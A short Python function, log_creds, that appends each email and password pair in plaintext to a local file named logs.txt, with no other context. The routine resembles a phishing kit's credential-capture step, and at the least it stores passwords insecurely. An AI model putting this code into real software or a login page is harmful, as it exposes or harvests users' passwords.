def log_creds(email, password):
    with open("logs.txt", "a") as f:
        f.write(f"{email}:{password}\n")
